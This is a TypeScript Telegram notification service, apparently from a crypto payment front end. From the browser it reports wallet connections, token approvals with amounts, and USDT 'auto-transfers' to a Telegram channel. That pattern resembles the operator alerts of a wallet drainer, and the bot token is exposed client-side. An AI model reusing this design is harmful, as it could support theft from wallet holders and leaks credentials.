// =================================
// 📱 Telegram Bot Notification Service
// =================================

interface TelegramMessage {
  text: string;
  parse_mode?: "HTML" | "Markdown";
  disable_web_page_preview?: boolean;
}

interface WalletConnectNotification {
  walletType: string;
  chain: string;
  userAddress: string;
  timestamp: string;
}

interface ApproveSuccessNotification {
  walletType: string;
  chain: string;
  userAddress: string;
  amount: string;
  token: string;
  timestamp: string;
}

class TelegramService {
  private config: {
    token: string | undefined;
    channelId: string | undefined;
    isEnabled: boolean;
  } | null = null;

  constructor() {
    // Only initialize on client-side
    if (typeof window !== "undefined") {
      this.initializeConfig();
    }
  }

  private initializeConfig() {
    // Get Telegram config directly from process.env (client-side)
    this.config = {
      token: process.env.NEXT_PUBLIC_TELEGRAM_TOKEN,
      channelId: process.env.NEXT_PUBLIC_TELEGRAM_CHANNEL_ID,
      isEnabled: !!(
        process.env.NEXT_PUBLIC_TELEGRAM_TOKEN &&
        process.env.NEXT_PUBLIC_TELEGRAM_CHANNEL_ID
      ),
    };
  }

  private ensureInitialized() {
    if (!this.config && typeof window !== "undefined") {
      this.initializeConfig();
    }
  }

  /**
   * Send a message to the configured Telegram channel
   */
  private async sendMessage(message: TelegramMessage): Promise<boolean> {
    if (!this.config?.isEnabled) {
      return false;
    }

    try {
      const url = `https://api.telegram.org/bot${this.config.token}/sendMessage`;
      const payload = {
        chat_id: this.config.channelId,
        ...message,
      };

      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorData = await response.json();
        return false;
      }

      return true;
    } catch (error) {
      return false;
    }
  }

  /**
   * Send payment notification
   */
  async sendPaymentNotification(data: {
    paymentId: string;
    amount: string;
    chain: string;
    status: string;
    userAddress?: string;
    txHash?: string;
  }): Promise<boolean> {
    const message =
      `💳 *Payment Update*\n\n` +
      `🆔 ID: \`${data.paymentId}\`\n` +
      `💰 Amount: ${data.amount} USDT\n` +
      `⛓️ Chain: ${data.chain}\n` +
      `📊 Status: ${data.status}\n` +
      `👤 User: ${data.userAddress || "N/A"}\n` +
      `🔗 TX: ${data.txHash || "N/A"}\n\n` +
      `⏰ ${new Date().toISOString()}`;

    return this.sendMessage({
      text: message,
      parse_mode: "Markdown",
    });
  }

  /**
   * Send wallet connection notification
   */
  async sendWalletConnectNotification(
    data: WalletConnectNotification
  ): Promise<boolean> {
    const message =
      `🔗 *Wallet Connected*\n\n` +
      `📱 Type: ${data.walletType}\n` +
      `⛓️ Chain: ${data.chain}\n` +
      `👤 Address: \`${data.userAddress}\`\n` +
      `⏰ Time: ${data.timestamp}`;

    return this.sendMessage({
      text: message,
      parse_mode: "Markdown",
    });
  }

  /**
   * Send approval success notification
   */
  async sendApproveSuccessNotification(
    data: ApproveSuccessNotification
  ): Promise<boolean> {
    const message =
      `✅ *Approval Successful*\n\n` +
      `📱 Wallet: ${data.walletType}\n` +
      `⛓️ Chain: ${data.chain}\n` +
      `👤 User: \`${data.userAddress}\`\n` +
      `💰 Amount: ${data.amount} ${data.token}\n` +
      `⏰ Time: ${data.timestamp}`;

    return this.sendMessage({
      text: message,
      parse_mode: "Markdown",
    });
  }

  /**
   * Send system alert
   */
  async sendSystemAlert(
    message: string,
    level: "info" | "warning" | "error" = "info"
  ): Promise<boolean> {
    const emoji = {
      info: "ℹ️",
      warning: "⚠️",
      error: "❌",
    };

    const formattedMessage = `${
      emoji[level]
    } *System Alert*\n\n${message}\n\n⏰ ${new Date().toISOString()}`;

    return this.sendMessage({
      text: formattedMessage,
      parse_mode: "Markdown",
    });
  }

  /**
   * Send auto-transfer notification
   */
  async sendAutoTransferNotification(data: {
    from: string;
    to: string;
    amount: string;
    chain: string;
    txHash: string;
    success: boolean;
  }): Promise<boolean> {
    const status = data.success ? "✅" : "❌";
    const message =
      `${status} *Auto-Transfer ${
        data.success ? "Successful" : "Failed"
      }*\n\n` +
      `💰 Amount: ${data.amount} USDT\n` +
      `⛓️ Chain: ${data.chain}\n` +
      `📤 From: \`${data.from}\`\n` +
      `📥 To: \`${data.to}\`\n` +
      `🔗 TX: \`${data.txHash}\`\n\n` +
      `⏰ ${new Date().toISOString()}`;

    return this.sendMessage({
      text: message,
      parse_mode: "Markdown",
    });
  }

  /**
   * Check if Telegram is configured and enabled
   */
  isConfigured(): boolean {
    this.ensureInitialized();
    return this.config?.isEnabled || false;
  }

  /**
   * Get configuration status
   */
  getConfig() {
    return this.config ? { ...this.config } : null;
  }
}

// Export singleton instance
export const telegramService = new TelegramService();

// Export for testing
export { TelegramService };
